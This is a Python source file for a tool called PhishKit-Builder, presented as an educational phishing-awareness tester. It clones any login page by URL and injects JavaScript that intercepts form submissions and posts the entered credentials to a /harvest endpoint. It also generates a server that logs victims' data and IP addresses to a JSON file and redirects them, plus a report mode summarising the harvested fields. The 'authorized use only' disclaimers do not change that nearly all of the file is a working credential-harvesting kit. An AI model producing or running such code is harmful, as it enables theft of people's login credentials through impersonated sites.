#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PhishKit-Builder
Author: Decryptious_ on Discord / Punchborn on IG
A cross-platform educational phishing awareness testing tool for authorized security training.
For authorized security testing and educational purposes only.
"""

import sys
import os
import json
import argparse
import re
import base64
import hashlib
import random
import string
import platform
import subprocess
import threading
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] Missing dependency: requests")
    print("[*] Install: pip install -r requirements.txt")
    sys.exit(1)

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class DummyFore:
        def __getattr__(self, name): return ''
    class DummyStyle:
        def __getattr__(self, name): return ''
    Fore = DummyFore()
    Style = DummyStyle()

# ── TITLE BLOCK ──
def print_title():
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'PhishKit-Builder':^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'Educational Phishing Awareness Testing Tool':^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  Author: Decryptious_ on Discord / Punchborn on IG{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  Platforms: Linux | Windows | macOS{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  Modes: Clone | Harvest | Report{Style.RESET_ALL}")
    print(f"{Fore.RED}  FOR AUTHORIZED SECURITY TESTING & EDUCATION ONLY{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print()

# ── USER AGENTS ──
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

class PhishKit:
    def __init__(self, target_url=None, output_dir="phishkit_output", port=8080, 
                 ssl=False, custom_js=None, redirect_url=None):
        self.target_url = target_url
        self.output_dir = output_dir
        self.port = port
        self.ssl = ssl
        self.custom_js = custom_js
        self.redirect_url = redirect_url
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        self.harvested = []
        self.server_running = False
        
    def _generate_id(self, length=8):
        """Generate random ID for tracking"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def clone_page(self):
        """Clone target login page and inject harvester"""
        if not self.target_url:
            print(f"{Fore.RED}[-] No target URL specified{Style.RESET_ALL}")
            return False
        
        print(f"{Fore.CYAN}[*] Cloning target: {self.target_url}{Style.RESET_ALL}")
        
        try:
            resp = self.session.get(self.target_url, timeout=30, allow_redirects=True)
            if resp.status_code != 200:
                print(f"{Fore.RED}[-] Failed to fetch target (status: {resp.status_code}){Style.RESET_ALL}")
                return False
            
            html = resp.text
            parsed = urlparse(self.target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # Create output directory
            os.makedirs(self.output_dir, exist_ok=True)
            assets_dir = os.path.join(self.output_dir, "assets")
            os.makedirs(assets_dir, exist_ok=True)
            
            # Download and rewrite assets
            html = self._process_assets(html, base_url, assets_dir)
            
            # Inject harvester script
            html = self._inject_harvester(html)
            
            # Fix form actions
            html = self._fix_forms(html)
            
            # Save cloned page
            index_path = os.path.join(self.output_dir, "index.html")
            with open(index_path, 'w', encoding='utf-8') as f:
                f.write(html)
            
            # Create harvester endpoint
            self._create_harvester_endpoint()
            
            # Create server script
            self._create_server_script()
            
            print(f"{Fore.GREEN}[+] Page cloned successfully{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Output: {os.path.abspath(self.output_dir)}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] To start harvester server:{Style.RESET_ALL}")
            print(f"    cd {self.output_dir}")
            print(f"    python3 server.py")
            
            return True
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Request failed: {e}{Style.RESET_ALL}")
            return False
        except Exception as e:
            print(f"{Fore.RED}[-] Clone failed: {e}{Style.RESET_ALL}")
            return False
    
    def _process_assets(self, html, base_url, assets_dir):
        """Download CSS, JS, images and rewrite paths"""
        # CSS
        css_urls = re.findall(r'href="([^"]+\.css[^"]*)"', html)
        for i, url in enumerate(css_urls):
                full_url = urljoin(base_url, url)
                try:
                    resp = self.session.get(full_url, timeout=10)
                    if resp.status_code == 200:
                        filename = f"style_{i}.css"
                        with open(os.path.join(assets_dir, filename), 'wb') as f:
                            f.write(resp.content)
                        html = html.replace(url, f"assets/{filename}")
                except:
                    pass
        
        # JS
        js_urls = re.findall(r'src="([^"]+\.js[^"]*)"', html)
        for i, url in enumerate(js_urls):
            if 'jquery' in url.lower() or 'bootstrap' in url.lower():
                continue  # Skip common libs, use CDN
            full_url = urljoin(base_url, url)
            try:
                resp = self.session.get(full_url, timeout=10)
                if resp.status_code == 200:
                    filename = f"script_{i}.js"
                    with open(os.path.join(assets_dir, filename), 'wb') as f:
                        f.write(resp.content)
                    html = html.replace(url, f"assets/{filename}")
            except:
                pass
        
        # Images
        img_urls = re.findall(r'src="([^"]+\.(?:png|jpg|jpeg|gif|svg)[^"]*)"', html)
        for i, url in enumerate(img_urls):
            full_url = urljoin(base_url, url)
            try:
                resp = self.session.get(full_url, timeout=10)
                if resp.status_code == 200:
                    ext = url.split('.')[-1].split('?')[0]
                    filename = f"img_{i}.{ext}"
                    with open(os.path.join(assets_dir, filename), 'wb') as f:
                        f.write(resp.content)
                    html = html.replace(url, f"assets/{filename}")
            except:
                pass
        
        # Favicon
        favicon_urls = re.findall(r'href="([^"]*favicon[^"]*)"', html)
        for i, url in enumerate(favicon_urls):
            full_url = urljoin(base_url, url)
            try:
                resp = self.session.get(full_url, timeout=10)
                if resp.status_code == 200:
                    filename = f"favicon_{i}.ico"
                    with open(os.path.join(assets_dir, filename), 'wb') as f:
                        f.write(resp.content)
                    html = html.replace(url, f"assets/{filename}")
            except:
                pass
        
        return html
    
    def _inject_harvester(self, html):
        """Inject credential harvesting JavaScript"""
        harvester_js = '''
<script>
(function() {
    var originalSubmit = HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit = function() {
        var formData = new FormData(this);
        var data = {};
        for (var pair of formData.entries()) {
            data[pair[0]] = pair[1];
        }
        
        // Add metadata
        data._timestamp = new Date().toISOString();
        data._userAgent = navigator.userAgent;
        data._referrer = document.referrer;
        data._url = window.location.href;
        
        // Send to harvester
        fetch('/harvest', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        }).then(function() {
            originalSubmit.call(this);
        }.bind(this)).catch(function() {
            originalSubmit.call(this);
        }.bind(this));
        
        return false;
    };
    
    // Intercept button clicks
    document.addEventListener('click', function(e) {
        if (e.target.type === 'submit' || e.target.closest('form')) {
            var form = e.target.closest('form') || e.target.form;
            if (form) {
                e.preventDefault();
                form.submit();
                return false;
            }
        }
    }, true);
})();
</script>
'''
        
        # Insert before closing </body> or </head>
        if '</body>' in html:
            html = html.replace('</body>', harvester_js + '\n</body>')
        elif '</head>' in html:
            html = html.replace('</head>', harvester_js + '\n</head>')
        else:
            html += harvester_js
        
        # Add custom JS if provided
        if self.custom_js and os.path.exists(self.custom_js):
            with open(self.custom_js, 'r') as f:
                custom = f'<script>{f.read()}</script>'
            html = html.replace('</body>', custom + '\n</body>')
        
        return html
    
    def _fix_forms(self, html):
        """Fix form actions to post to local harvester"""
        # Replace form actions
        html = re.sub(r'<form[^>]*action="[^"]*"', '<form action="/harvest" method="POST"', html, flags=re.IGNORECASE)
        html = re.sub(r"<form[^>]*action='[^']*'", "<form action='/harvest' method='POST'", html, flags=re.IGNORECASE)
        
        # Ensure forms without action post to harvester
        html = re.sub(r'<form(?![^>]*action)', '<form action="/harvest" method="POST"', html, flags=re.IGNORECASE)
        
        return html
    
    def _create_harvester_endpoint(self):
        """Create the harvester server script"""
        redirect = self.redirect_url or "https://www.google.com"
        
        server_code = f'''#!/usr/bin/env python3
# PhishKit-Builder Harvester Server
# Author: Decryptious_ on Discord / Punchborn on IG
# FOR AUTHORIZED TESTING ONLY

import os
import sys
import json
import cgi
import base64
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

HARVEST_FILE = "harvested_credentials.json"
PORT = {self.port}

class HarvesterHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Suppress default logging
    
    def do_GET(self):
        if self.path == '/':
            self._serve_file('index.html')
        elif self.path.startswith('/assets/'):
            self._serve_file(self.path.lstrip('/'))
        else:
            self._serve_file('index.html')
    
    def do_POST(self):
        if self.path == '/harvest':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                self._save_harvest(data)
                self._send_response(200, "OK")
            except:
                # Parse form data
                data = parse_qs(post_data.decode('utf-8'))
                flat_data = {{k: v[0] if isinstance(v, list) else v for k, v in data.items()}}
                self._save_harvest(flat_data)
                self._send_response(200, "OK")
            
            # Redirect victim
            self.send_response(302)
            self.send_header('Location', '{redirect}')
            self.end_headers()
        else:
            self._send_response(404, "Not Found")
    
    def _serve_file(self, filepath):
        try:
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    content = f.read()
                
                ext = os.path.splitext(filepath)[1].lower()
                content_types = {{
                    '.html': 'text/html',
                    '.css': 'text/css',
                    '.js': 'application/javascript',
                    '.png': 'image/png',
                    '.jpg': 'image/jpeg',
                    '.jpeg': 'image/jpeg',
                    '.gif': 'image/gif',
                    '.svg': 'image/svg+xml',
                    '.ico': 'image/x-icon'
                }}
                
                self.send_response(200)
                self.send_header('Content-Type', content_types.get(ext, 'application/octet-stream'))
                self.end_headers()
                self.wfile.write(content)
            else:
                self._send_response(404, "Not Found")
        except:
            self._send_response(500, "Error")
    
    def _save_harvest(self, data):
        entry = {{
            "timestamp": datetime.now().isoformat(),
            "ip": self.client_address[0],
            "user_agent": self.headers.get('User-Agent', 'Unknown'),
            "referrer": self.headers.get('Referer', 'Unknown'),
            "data": data
        }}
        
        harvests = []
        if os.path.exists(HARVEST_FILE):
            try:
                with open(HARVEST_FILE, 'r') as f:
                    harvests = json.load(f)
            except:
                pass
        
        harvests.append(entry)
        
        with open(HARVEST_FILE, 'w') as f:
            json.dump(harvests, f, indent=2)
        
        print(f"[HARVEST] {{entry['timestamp']}} | IP: {{entry['ip']}} | Data: {{json.dumps(data)[:100]}}...")
    
    def _send_response(self, code, message):
        self.send_response(code)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(message.encode())

def run():
    server = HTTPServer(('0.0.0.0', PORT), HarvesterHandler)
    print(f"[*] Harvester server running on http://0.0.0.0:{{PORT}}")
    print(f"[*] Press Ctrl+C to stop")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\\n[!] Server stopped")

if __name__ == "__main__":
    run()
'''
        
        server_path = os.path.join(self.output_dir, "server.py")
        with open(server_path, 'w', encoding='utf-8') as f:
            f.write(server_code)
        
        os.chmod(server_path, 0o755)
    
    def generate_report(self, harvest_file):
        """Generate report from harvested data"""
        if not os.path.exists(harvest_file):
            print(f"{Fore.RED}[-] Harvest file not found: {harvest_file}{Style.RESET_ALL}")
            return
        
        try:
            with open(harvest_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to parse harvest file: {e}{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'PhishKit-Builder Harvest Report':^60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Author: Decryptious_ on Discord / Punchborn on IG{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] Total harvests: {len(data)}{Style.RESET_ALL}")
        
        # Unique IPs
        ips = set()
        for entry in data:
            ips.add(entry.get('ip', 'Unknown'))
        print(f"{Fore.CYAN}[*] Unique IPs: {len(ips)}{Style.RESET_ALL}")
        
        # Timeline
        print(f"\n{Fore.CYAN}[*] Harvest Timeline:{Style.RESET_ALL}")
        for entry in data:
            ts = entry.get('timestamp', 'Unknown')
            ip = entry.get('ip', 'Unknown')
            ua = entry.get('user_agent', 'Unknown')[:50]
            print(f"  {Fore.GREEN}{ts}{Style.RESET_ALL} | {Fore.YELLOW}{ip}{Style.RESET_ALL} | {ua}")
        
        # Data summary
        print(f"\n{Fore.CYAN}[*] Field Analysis:{Style.RESET_ALL}")
        field_counts = {}
        for entry in data:
            for key in entry.get('data', {}).keys():
                if not key.startswith('_'):
                    field_counts[key] = field_counts.get(key, 0) + 1
        
        for field, count in sorted(field_counts.items(), key=lambda x: x[1], reverse=True):
            print(f"  {Fore.YELLOW}{field}: {count} occurrences{Style.RESET_ALL}")
        
        # Save report
        report_file = f"phishkit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        report = {
            "tool": "PhishKit-Builder",
            "author": "Decryptious_ on Discord / Punchborn on IG",
            "generated": datetime.now().isoformat(),
            "statistics": {
                "total_harvests": len(data),
                "unique_ips": len(ips),
                "fields_found": list(field_counts.keys())
            },
            "harvests": data
        }
        
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Report saved: {report_file}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description="PhishKit-Builder - Educational phishing awareness testing tool",
        epilog="FOR AUTHORIZED TESTING ONLY. Misuse is illegal."
    )
    
    subparsers = parser.add_subparsers(dest='command', help='Command to run')
    
    # Clone command
    clone_parser = subparsers.add_parser('clone', help='Clone target login page')
    clone_parser.add_argument("-u", "--url", required=True, help="Target URL to clone")
    clone_parser.add_argument("-o", "--output", default="phishkit_output", help="Output directory")
    clone_parser.add_argument("-p", "--port", type=int, default=8080, help="Server port")
    clone_parser.add_argument("--redirect", help="URL to redirect after harvest")
    clone_parser.add_argument("--custom-js", help="Custom JavaScript file to inject")
    
    # Report command
    report_parser = subparsers.add_parser('report', help='Generate report from harvest file')
    report_parser.add_argument("-f", "--file", required=True, help="Harvested_credentials.json file")
    
    # List command
    list_parser = subparsers.add_parser('templates', help='List built-in templates')
    
    parser.add_argument("--no-banner", action="store_true", help="Hide startup banner")
    
    args = parser.parse_args()
    
    if not args.no_banner:
        print_title()
    
    if not args.command:
        parser.print_help()
        sys.exit(1)
    
    if args.command == 'clone':
        print(f"{Fore.YELLOW}[!] WARNING: This tool is for authorized testing only{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Ensure you have explicit permission to test the target{Style.RESET_ALL}")
        confirm = input(f"{Fore.CYAN}[?] Do you have authorization? (yes/no): {Style.RESET_ALL}")
        if confirm.lower() != 'yes':
            print(f"{Fore.RED}[-] Aborted. Authorization required.{Style.RESET_ALL}")
            sys.exit(1)
        
        kit = PhishKit(
            target_url=args.url,
            output_dir=args.output,
            port=args.port,
            redirect_url=args.redirect,
            custom_js=args.custom_js
        )
        kit.clone_page()
    
    elif args.command == 'report':
        kit = PhishKit()
        kit.generate_report(args.file)
    
    elif args.command == 'templates':
        print(f"{Fore.CYAN}[*] Built-in capabilities:{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}1. Clone any login page by URL{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}2. Auto-download CSS/JS/Images{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}3. Inject credential harvester{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}4. Built-in HTTP server with redirect{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}5. JSON export of harvested data{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}6. Report generation with statistics{Style.RESET_ALL}")


if __name__ == "__main__":
    main()